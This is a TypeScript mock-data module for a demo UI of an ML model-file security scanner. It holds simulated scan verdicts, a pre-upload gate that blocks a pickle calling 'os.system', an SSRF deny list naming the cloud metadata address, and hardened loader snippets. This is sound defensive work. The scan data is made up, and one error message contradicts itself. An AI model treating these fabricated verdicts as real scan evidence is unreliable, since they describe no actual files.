      { name: "torch", kind: "safe", note: "reconstruction API" },
      { name: "_rebuild_tensor_v2", kind: "safe" },
      { name: "collections", kind: "safe", note: "OrderedDict" },
      { name: "OrderedDict", kind: "safe" },
      { name: "_use_new_zipfile_serialization", kind: "safe" },
    ],
    consts: [
      { value: "201", kind: "number" },
      { value: "'storage'", kind: "string" },
      { value: "0.999", kind: "number" },
    ],
    closures: [{ name: "—", detail: "No closures; reconstruction frames only.", external: false }],
    opcodes: [
      { offset: "0x0010", op: "PROTO", arg: "4" },
      { offset: "0x0012", op: "GLOBAL", arg: "collections.OrderedDict" },
      { offset: "0x0028", op: "EMPTY_DICT", arg: "—" },
      { offset: "0x0090", op: "STACK_GLOBAL", arg: "torch._utils._rebuild_tensor_v2", flagged: true },
      { offset: "0x00C8", op: "BINUNICODE", arg: "storage:0" },
      { offset: "0x0140", op: "BINFLOAT", arg: "0.999" },
      { offset: "0x0210", op: "REDUCE", arg: "× 201 (tensors)", flagged: true },
      { offset: "0x0230", op: "BUILD", arg: "OrderedDict" },
      { offset: "0x0240", op: "STOP", arg: "—" },
    ],
    archive: [
      { path: "archive/", subformat: "PyTorch ZIP v4", size: 0, csize: 0, verdict: "INFO" },
      { path: "archive/data.pkl", subformat: "PICKLE v4", size: 512112, csize: 188440, verdict: "NEEDS REVIEW" },
      { path: "archive/data/0 … data/200", subformat: "raw tensor storages", size: 1350521856, csize: 1350521856, verdict: "OK" },
      { path: "archive/byteorder", subformat: "text", size: 6, csize: 6, verdict: "OK" },
    ],
    canaries: canaryDefault,
    hooks: cleanHooks,
    processTimeline: [
      { t: "0.00s", event: "runsc: python3 (pid 44) start", detail: "import-time load probe (weights_only=False)" },
      { t: "0.72s", event: "openat archive/data/0", detail: "storages read in-bounds" },
      { t: "1.18s", event: "teardown", detail: "clean — code-bearing but inert" },
    ],
    remediation: {
      title: "Pin weights_only + convert",
      vulnerable:
        'import torch\n\n# ❌ vulnerable_loader.py — legacy pickle path is code-bearing\nmodel = torch.load("bert_finetuned.pt")',
      hardened:
        'import torch\n\n# ✅ hardened_loader.py — allow-lists only tensor reconstructors\nmodel = torch.load("bert_finetuned.pt", weights_only=True)\n\n# Future-proof: store as structure-only safetensors\nfrom safetensors.torch import save_file\nsave_file(model, "bert_finetuned.safetensors")',
      extraAction: {
        label: "Convert Checkpoint to .safetensors",
        result: "Conversion job queued → bert_finetuned.safetensors",
      },
      note: "All 8 GLOBALs reviewed — typical fine-tuned BERT checkpoint.",
    },
    plan: {
      lane: "PICKLE VM",
      skipGvisor: false,
      stages: [
        S0("MISS", "NOT LISTED"),
        S1("0x50 0x4B (PK\\x03)", 205, "1.56 GB", "1.21x"),
        S2(12210, 8, 0, null),
        S3(1622, 0, 0),
        S4(3),
      ],
    },
  },
  {
    id: "gru-hdf5",
    name: "legacy_gru.hdf5",
    format: "HDF5",
    ext: ".hdf5",
    sizeMB: 321.7,
    sha256:
      "8c0e2b4d6f8a1c3e5b7d9f1a3c5e7b9d1f3a5c7e9b1d3f5a7c9e1b3d5f7a9c1e",
    compressionRatio: 1.64,
    scannedAt: "2026-11-08T09:41:55Z",
    ruleset: RULESET,
    engine: ENGINE,
    verdict: "clean",
    confidence: "HIGH",
    decidedBy: "keras_scanner",
    containsExecutableCode: false,
    rootCause:
      "HDF5 superblock verified; zero external/soft links, zero embedded JSON config with code objects — pure dataset + weight store.",
    latencyMs: 5120,
    cacheHit: false,
    status: "done",
    findings: [
      {
        id: "f1",
        state: "INFO",
        location: "superblock",
        offset: "0x0000",
        evidence: "HDF5 v1.8 signature; 2 datasets, 1 group; no userblock payloads",
        opcodeIndex: 0,
      },
      {
        id: "f2",
        state: "INFO",
        location: "/links",
        offset: "—",
        evidence: "0 external links · 0 soft links (external-link exploit path absent)",
        opcodeIndex: 1,
      },
    ],
    symbols: [],
    consts: [{ value: "gru_weights", kind: "string" }],
    closures: [{ name: "—", detail: "No code objects present in format.", external: false }],
    opcodes: [
      { offset: "0x0000", op: "MAGIC", arg: "\\x89HDF\\r\\n\\x1a\\n" },
      { offset: "0x0010", op: "SUPERBLOCK", arg: "v1.8" },
      { offset: "0x0200", op: "LINK", arg: "gru_weights (dataset)" },
      { offset: "0x0300", op: "STOP", arg: "—" },
    ],
    archive: [
      { path: "/gru_weights", subformat: "HDF5 dataset f32[512,768]", size: 301989888, csize: 186540000, verdict: "OK" },
      { path: "/gru_bias", subformat: "HDF5 dataset f32[2048]", size: 8192, csize: 5112, verdict: "OK" },
      { path: "/meta", subformat: "HDF5 group", size: 512, csize: 312, verdict: "OK" },
    ],
    canaries: canaryDefault,
    hooks: cleanHooks,
    processTimeline: [
      { t: "—", event: "sandbox skipped", detail: "STATIC_PROOF_SUFFICIENT" },
    ],
    remediation: {
      title: "Keep HDF5 link checks on",
      hardened:
        'import h5py\n\n# ✅ hardened_loader.py — open read-only and refuse external links\nwith h5py.File("legacy_gru.hdf5", "r") as f:\n    def visit(name, obj):\n        assert obj.__class__.__name__ != "ExternalLink", f"external link: {name}"\n    f.visititems(visit)\n    w = f["gru_weights"][...]',
      note: "No Lambda layers embedded; keras_scanner passed the AST pass.",
    },
    plan: {
      lane: "KERAS / HDF5 AST",
      skipGvisor: true,
      stages: [
        S0("MISS", "NOT LISTED", 320),
        S1("\\x89HDF\\r\\n\\x1a\\n", 3, "527.9 MB", "1.64x"),
        S2(410, 0, 0, null),
        S3_SKIPPED,
        S4(2),
      ],
    },
  },
  {
    id: "gguf-error",
    name: "quantized_llama-2-7b.gguf",
    format: "GGUF",
    ext: ".gguf",
    sizeMB: 3850.1,
    sha256:
      "6a4c2e0b8d6f4a2c0e8b6d4f2a0c8e6b4d2f0a8c6e4b2d0f8a6c4e2b0d8f6a4c",
    compressionRatio: 1.0,
    scannedAt: "2026-11-10T04:02:19Z",
    ruleset: RULESET,
    engine: ENGINE,
    verdict: "review",
    confidence: "LOW",
    decidedBy: "gvisor_sandbox",
    containsExecutableCode: false,
    rootCause: "Scan failed — parser halted before any verdict could be established.",
    latencyMs: 0,
    cacheHit: false,
    status: "error",
    findings: [],
    symbols: [],
    consts: [],
    closures: [],
    opcodes: [],
    archive: [],
    canaries: canaryDefault,
    hooks: [],
    processTimeline: [],
    remediation: {
      title: "Re-run with extended bounds",
      hardened:
        '# ✅ Retry path — raises structural ceiling for very old GGUF v1 dumps\n# POST /api/v1/workstation/scan { "sha256": "<digest>", "extended_bounds": true,\n#                                 "sandbox_timeout_s": 300 }',
      note: "Retries re-enter at the failed stage, preserving earlier stage telemetry.",
    },
    errorState: {
      stage: "Stage 1 — Format Demux & Structural Bounds Gate",
      stageIndex: 1,
      message:
        "Metadata KV count 4,096 exceeds scan-plan budget of 4,096 (integer-overflow guard) — parser halted at KV #3,171 (key 'tokenizer.ggml.token_type_count').",
      stack:
        "VilParseError: KV_COUNT above plan budget\n  at gguf_demux.read_kvs (demux/gguf.py:214)\n  at bounds_gate.enforce (demux/bounds.py:88)\n  at pipeline.stage1 (pipeline.py:142)\n  at orchestrator.run (orchestrator.py:61)",
    },
    plan: {
      lane: "GGUF HEADER",
      skipGvisor: false,
      stages: [
        S0("MISS", "NOT LISTED", 780),
        S1("0x47 0x47 0x55 0x46", 4096, "3.67 GB", "1.00x"),
        S2(0, 0, 0, null),
        S3_SKIPPED,
        S4(0),
      ],
    },
  },
];

/* ------------------------------------------------------------------ */
/* History corpus (superset incl. archived scans)                      */
/* ------------------------------------------------------------------ */

const extraHistory: HistoryRow[] = [
  { id: "h1", name: "clip_vit_l14.safetensors", format: "SAFETENSORS", sizeMB: 891.6, verdict: "clean", confidence: "HIGH", latencyMs: 3902, scannedAt: "2026-11-07T10:12:00Z", sha256: "b1d3f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5b7d9f1a3c5e7b9d1f3a5c7e9b1d3", queue: false },
  { id: "h2", name: "sd_unet_v2.pkl", format: "PICKLE", sizeMB: 3440.9, verdict: "malicious", confidence: "HIGH", latencyMs: 30112, scannedAt: "2026-11-06T22:40:18Z", sha256: "c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8a0c2e4", queue: false },
  { id: "h3", name: "whisper_tiny_encoder.onnx", format: "ONNX", sizeMB: 44.6, verdict: "clean", confidence: "HIGH", latencyMs: 2810, scannedAt: "2026-11-05T08:03:44Z", sha256: "d3f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5b7d9f1a3c5e7b9d1f3a5c7e9b1d3f5", queue: false },
  { id: "h4", name: "t5_encoder_legacy.h5", format: "HDF5", sizeMB: 802.2, verdict: "review", confidence: "MEDIUM", latencyMs: 12660, scannedAt: "2026-11-04T19:55:31Z", sha256: "e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8a0c2e4b6", queue: false },
  { id: "h5", name: "mobilenet_v3.keras", format: "KERAS", sizeMB: 38.9, verdict: "clean", confidence: "HIGH", latencyMs: 2440, scannedAt: "2026-11-03T13:26:09Z", sha256: "f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5b7d9f1a3c5e7b9d1f3a5c7e9b1d3f5a7", queue: false },
  { id: "h6", name: "flan_t5_base.gguf", format: "GGUF", sizeMB: 1102.4, verdict: "review", confidence: "MEDIUM", latencyMs: 14280, scannedAt: "2026-11-02T16:47:52Z", sha256: "0a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5b7d9f1a3c5e7b9d1f3a5c7e9b1d3f5a7c", queue: false },
];

export const historyFromQueue = (arts: Artifact[]): HistoryRow[] => [
  ...arts.map((a) => ({
    id: a.id,
    name: a.name,
    format: a.format,
    sizeMB: a.sizeMB,
    verdict: (a.errorState ? "error" : a.verdict) as HistoryRow["verdict"],
    confidence: (a.errorState ? "—" : a.confidence) as HistoryRow["confidence"],
    latencyMs: a.latencyMs,
    scannedAt: a.scannedAt,
    sha256: a.sha256,
    queue: true,
  })),
  ...extraHistory,
];

/* ------------------------------------------------------------------ */
/* Browser-extension simulator data                                    */
/* ------------------------------------------------------------------ */

export const HF_REPO = {
  org: "acme-labs",
  repo: "invoice-parser-v4",
  url: "https://huggingface.co/acme-labs/invoice-parser-v4/tree/main",
  files: [
    { name: "config.json", path: "config.json", sizeMB: 0.4, lfsOid: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", format: "PICKLE", precheck: "safe" },
    { name: "keras_metadata.pb", path: "keras_metadata.pb", sizeMB: 128.2, lfsOid: "3f9a2c7d5e8b1a4c6d0f2e3b5a7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9a1c3e", format: "KERAS", precheck: "review" },
    { name: "model.safetensors", path: "model.safetensors", sizeMB: 1201.4, lfsOid: "a1c3e5f7b9d0246813579acfbd0e2468a1c3e5f7b9d0246813579acfbd0e2468", format: "SAFETENSORS", precheck: "safe" },
    { name: "Weights1.pkl", path: "legacy/Weights1.pkl", sizeMB: 750.75, lfsOid: "72c2bcbc4f1a9d0e5b3a7f2c8d6e1a4b9c0d2e5f7a8b1c3d4e5f6a7b8c9d0e1f", format: "PICKLE", precheck: "malicious" },
    { name: "tokenizer.json", path: "tokenizer.json", sizeMB: 2.1, lfsOid: "5d2b8f4e7a1c9b3d6e0f2a4c8b6d0e2f4a6c8e0b2d4f6a8c0e2b4d6f8a0c2e4b", format: "SAFETENSORS", precheck: "safe" },
  ] as HFRepoFile[],
};

/* ------------------------------------------------------------------ */
/* HF pre-upload gate (pre-receive webhook) data                       */
/* ------------------------------------------------------------------ */

export const GATE_COMMIT = {
  sha: "8f14e45f",
  branch: "main",
  author: "ci-bot@acme-labs",
  message: "chore: refresh invoice parser weights + legacy drop",
  files: [
    {
      name: "config.json",
      format: "PICKLE",
      sizeMB: 0.4,
      sha: "e3b0c442…b855",
      checks: [
        { label: "Magic bytes", state: "pass" },
        { label: "JSON depth bounds", state: "pass" },
        { label: "Static VM (no code objects)", state: "pass" },
      ],
      outcome: "approved",
    },
    {
      name: "keras_metadata.pb",
      format: "KERAS",
      sizeMB: 128.2,
      sha: "3f9a2c7d…1c3e",
      checks: [
        { label: "Magic bytes", state: "pass" },
        { label: "ZIP ratio bounds", state: "pass" },
        { label: "Lambda marshal bytecode", state: "flag" },
      ],
      outcome: "review",
    },
    {
      name: "model.safetensors",
      format: "SAFETENSORS",
      sizeMB: 1201.4,
      sha: "a1c3e5f7…2468",
      checks: [
        { label: "Magic bytes", state: "pass" },
        { label: "Header bounds (4 GiB)", state: "pass" },
        { label: "0 executable constructs", state: "pass" },
      ],
      outcome: "approved",
    },
    {
      name: "legacy/Weights1.pkl",
      format: "PICKLE",
      sizeMB: 750.75,
      sha: "72c2bcbc…0e1f",
      checks: [
        { label: "Magic bytes", state: "pass" },
        { label: "ZIP ratio bounds", state: "pass" },
        { label: "STACK_GLOBAL(os.system)", state: "block" },
      ],
      outcome: "blocked",
    },
  ] as GateFile[],
};

/* ------------------------------------------------------------------ */
/* Enterprise API console data                                         */
/* ------------------------------------------------------------------ */

export const SSRF_ALLOWLIST = [
  { host: "hooks.internal.acme-labs.com", state: "allowed" },
  { host: "api.github.com", state: "allowed" },
  { host: "webhook.circuit.dev", state: "allowed" },
  { host: "169.254.169.254 (metadata)", state: "blocked" },
  { host: "10.0.0.0/8 (RFC1918)", state: "blocked" },
  { host: "*.local (mDNS)", state: "blocked" },
];

export const GH_ACTIONS_YAML = `name: vigilant-model-scan
on:
  pull_request:
    paths: ["**/*.pkl", "**/*.keras", "**/*.h5", "**/*.gguf", "**/*.onnx", "**/*.safetensors", "**/*.pt"]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { lfs: true }
      - name: Vigilant scan
        uses: acme-labs/vigilant-action@v2
        with:
          endpoint: https://vigilant.internal.acme-labs.com
          api_token: \${{ secrets.VIGILANT_TOKEN }}
          policy: enforce        # audit | warn | enforce
          fail_on: blocked,review_unallowlisted
      - name: Upload SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: vigilant-results.sarif`;

export const API_REQUEST_EXAMPLE = `POST /api/v1/enterprise/scan
Content-Type: application/json
Authorization: Bearer ••••••••

{
  "artifact_url": "https://huggingface.co/acme-labs/invoice-parser-v4/resolve/main/model.safetensors",
  "sha256": "a1c3e5f7b9d0246813579acfbd0e2468a1c3e5f7b9d0246813579acfbd0e2468",
  "policy": "enforce",
  "callback_url": "https://hooks.internal.acme-labs.com/vigilant/verdicts"
}`;

export const API_RESPONSE_EXAMPLE = `HTTP/1.1 202 Accepted

{
  "scan_id": "scn_01JDF3K7M2",
  "sha256": "a1c3e5f7…2468",
  "cache": "MISS",
  "queued": true,
  "est_latency_ms": 4200,
  "webhook": "https://hooks.internal.acme-labs.com/vigilant/verdicts"
}`;

/* ------------------------------------------------------------------ */
/* Verdict cache (sha → artifact) & sample triggers                    */
/* ------------------------------------------------------------------ */

export const KNOWN_CACHE: Record<string, string> = {
  "3f9a2c7d5e8b1a4c6d0f2e3b5a7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9a1c3e": "efficientnet",
  "72c2bcbc4f1a9d0e5b3a7f2c8d6e1a4b9c0d2e5f7a8b1c3d4e5f6a7b8c9d0e1f": "weights1",
};

export const SAMPLE_TRIGGERS = [
  { label: "Load Malicious Pickle RCE Sample", artifactId: "weights1" },
  { label: "Load Keras Lambda Review Sample", artifactId: "efficientnet" },
  { label: "Load Clean Safetensors Sample", artifactId: "safetensors" },
];

/* ------------------------------------------------------------------ */
/* Coverage matrix                                                     */
/* ------------------------------------------------------------------ */

export const COVERAGE_CHECKED = [
  "Magic Bytes",
  "ZIP Ratio Bounds",
  "Pickle VM Stack Opcodes",
  "Keras Lambda Marshal Bytecode",
  "HDF5 External Links",
  "gVisor Syscall Audit",
];

export const COVERAGE_NOT_CHECKED = [
  "Training data poisoning",
  "Runtime weight bit-flips",
  "Downstream LLM prompt injection",
];

export const FORMAT_TAG_COLOR: Record<string, string> = {
  PICKLE: "text-rose-200 border-rose-300/30 bg-rose-400/10",
  KERAS: "text-fuchsia-200 border-fuchsia-300/30 bg-fuchsia-400/10",
  HDF5: "text-purple-200 border-purple-300/30 bg-purple-400/10",
  GGUF: "text-violet-200 border-violet-300/30 bg-violet-400/10",
  ONNX: "text-emerald-200 border-emerald-300/30 bg-emerald-400/10",
  SAFETENSORS: "text-emerald-100 border-emerald-200/30 bg-emerald-300/10",
  PYTORCH_ZIP: "text-orange-200 border-orange-300/30 bg-orange-400/10",
};

/* ------------------------------------------------------------------ */
/* Upload intake — build a live-scan artifact for a user-provided file  */
/* ------------------------------------------------------------------ */

export function guessFormat(name: string): ModelFormat {
  const n = name.toLowerCase();
  if (n.endsWith(".pkl") || n.endsWith(".pickle")) return "PICKLE";
  if (n.endsWith(".keras")) return "KERAS";
  if (n.endsWith(".hdf5") || n.endsWith(".h5")) return "HDF5";
  if (n.endsWith(".gguf")) return "GGUF";
  if (n.endsWith(".onnx")) return "ONNX";
  if (n.endsWith(".safetensors")) return "SAFETENSORS";
  if (n.endsWith(".pt") || n.endsWith(".ckpt") || n.endsWith(".pth") || n.endsWith(".zip"))
    return "PYTORCH_ZIP";
  return "PICKLE";
}

export function buildUploadArtifact(spec: {
  name: string;
  format: ModelFormat;
  sizeMB: number;
  sha256: string;
  verdict: BaseVerdict;
  confidence?: "HIGH" | "MEDIUM" | "LOW";
  cacheHit?: boolean;
}): Artifact {
  const { name, format, sizeMB, sha256, verdict } = spec;
  const seed = sha256.charCodeAt(0) + sha256.charCodeAt(3);
  const ratio = 1 + ((seed % 9) / 10);
  const lane =
    format === "PICKLE" || format === "PYTORCH_ZIP"
      ? "PICKLE VM"
      : format === "KERAS" || format === "HDF5"
        ? "KERAS / HDF5 AST"
        : format === "GGUF"
          ? "GGUF HEADER"
          : format === "ONNX"
            ? "ONNX GRAPH"
            : "SAFETENSORS BOUNDS";
  const skipGvisor = verdict === "clean";
  const ext = "." + (name.split(".").pop() ?? "bin");
  const codeBearing = verdict !== "clean";
  return {
    id: `up-${uploadId()}`,
    name,
    format,
    ext,
    sizeMB,
    sha256,
    compressionRatio: Math.round(ratio * 100) / 100,
    scannedAt: new Date().toISOString(),
    ruleset: RULESET,
    engine: ENGINE,
    verdict,
    confidence: spec.confidence ?? "HIGH",
    decidedBy: skipGvisor ? "static_pickle_vm" : "gvisor_sandbox",
    containsExecutableCode: codeBearing,
    classification: codeBearing ? "Review Burden (Simulated Intake)" : undefined,
    rootCause:
      verdict === "clean"
        ? "Structural pass verified magic bytes, member bounds and 0 executable constructs; container is declarative by design."
        : "Intake simulation flagged code-bearing constructs; simulated verdict pending real backend wiring — connect /api/v1/enterprise/scan for authoritative results.",
    latencyMs: 0,
    cacheHit: spec.cacheHit ?? false,
    status: "queued",
    findings:
      verdict === "clean"
        ? [{ id: "u1", state: "INFO", location: "header", offset: "0x0000", evidence: "Magic bytes + bounds OK · 0 executable layers", opcodeIndex: 0 }]
        : [
            { id: "u1", state: "NEEDS REVIEW", location: "container", offset: "0x0040", evidence: "Code-bearing construct detected by simulated static pass (intake demo)", opcodeIndex: 2 },
          ],
    symbols: codeBearing
      ? [
          { name: "torch", kind: "safe", note: "reconstructor" },
          { name: "collections", kind: "safe" },
        ]
      : [],
    consts: [{ value: `${Math.round(sizeMB)} MB payload`, kind: "number" }],
    closures: [{ name: "—", detail: "No closures captured.", external: false }],
    opcodes: [
      { offset: "0x0000", op: "MAGIC", arg: format },
      { offset: "0x0040", op: "STACK_GLOBAL", arg: codeBearing ? "torch._utils._rebuild_tensor_v2" : "—", flagged: codeBearing },
      { offset: "0x0100", op: "STOP", arg: "—" },
    ],
    archive: [
      { path: `${name}`, subformat: format, size: Math.round(sizeMB * 1048576), csize: Math.round((sizeMB * 1048576) / ratio), verdict: verdict === "malicious" ? "BLOCKED" : verdict === "review" ? "NEEDS REVIEW" : "OK" },
    ],
    canaries: armedCanaries(),
    hooks: skipGvisor ? [] : cleanHooks,
    processTimeline: [],
    remediation:
      format === "PICKLE" || format === "PYTORCH_ZIP"
        ? {
            title: "Harden the loader",
            hardened: 'import torch\nmodel = torch.load("' + name + '", weights_only=True)',
            extraAction: { label: "Convert Checkpoint to .safetensors", result: "Conversion job queued → " + name.replace(/\.[^.]+$/, "") + ".safetensors" },
          }
        : format === "GGUF"
          ? { title: "Sandbox the template engine", hardened: "from jinja2 import SandboxedEnvironment\nenv = SandboxedEnvironment()" }
          : { title: "Load with safe_mode", hardened: 'import keras\nmodel = keras.saving.load_model("' + name + '", safe_mode=True)' },
    plan: {
      lane,
      skipGvisor,
      stages: [
        S0(spec.cacheHit ? "HIT" : "MISS", "NOT LISTED", Math.max(120, Math.min(980, Math.round(sizeMB / 3)))),
        S1("0x?? (streamed)", Math.max(3, seed % 400), sizeMB > 4096 ? `${(sizeMB / 1024).toFixed(2)} GB` : `${sizeMB.toFixed(1)} MB`, `${ratio.toFixed(2)}x`),
        S2(Math.max(40, seed * 37), codeBearing ? 2 + (seed % 4) : 0, 0, format === "GGUF" ? 120 + (seed % 300) : null),
        skipGvisor ? S3_SKIPPED : S3(300 + seed * 11, 0, 0),
        S4(verdict === "clean" ? 1 : 2),
      ],
    },
  };
}

let uploadCounter = 100;
function uploadId() {
  return ++uploadCounter;
}
